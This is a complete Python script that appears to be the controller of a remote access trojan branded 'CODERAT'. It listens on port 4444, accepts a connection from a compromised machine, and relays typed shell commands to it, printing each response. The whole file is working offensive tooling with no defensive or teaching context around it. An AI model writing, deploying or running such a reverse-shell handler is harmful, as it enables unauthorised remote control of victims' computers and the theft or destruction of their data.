import socket
import sys
import os
from colorama import Style, Fore

def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 4444
        s = socket.socket()

        os.system("cls")
        print("\n")
        print("░█████╗░░█████╗░██████╗░███████╗██████╗░░█████╗░████████╗")
        print("██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗╚══██╔══╝")
        print("██║░░╚═╝██║░░██║██║░░██║█████╗░░██████╔╝███████║░░░██║░░░")
        print("██║░░██╗██║░░██║██║░░██║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░")
        print("╚█████╔╝╚█████╔╝██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░")
        print("░╚════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░")
        print("\n")
    except socket.error as err:
        print(Style.DIM + Fore.RED + "[-] Error in socket creation: ", str(err))


def bindSocket():
    try:
        global host
        global port
        global s
        print(Style.BRIGHT + Fore.YELLOW + "[+] Binding socket to port " + str(port) + "\n")
        s.bind((host, port))
        s.listen(5)
        print(Fore.BLUE + "[*] Waiting for incoming connections..." + "\n")
    except socket.error as err:
        print(Style.DIM + Fore.RED + "[-] Error while binding socket: " + str(err) + "\n" + "Retrying...")
        bindSocket()


def acceptConnection():
    c, addr = s.accept()
    print(Fore.YELLOW + "[+] Authorized! ", addr)
    sendCommands(c)
    c.close()

def sendCommands(c):
    while True:
        cmd = input()

        if cmd == "exit":
            c.close()
            s.close()
            sys.exit()
        if len(cmd) > 0:
            c.send(cmd.encode())
            response = str(c.recv(32768), "utf-8")
            print(Style.RESET_ALL, response, end='')


def main():
    createSocket()
    bindSocket()
    acceptConnection()

main()
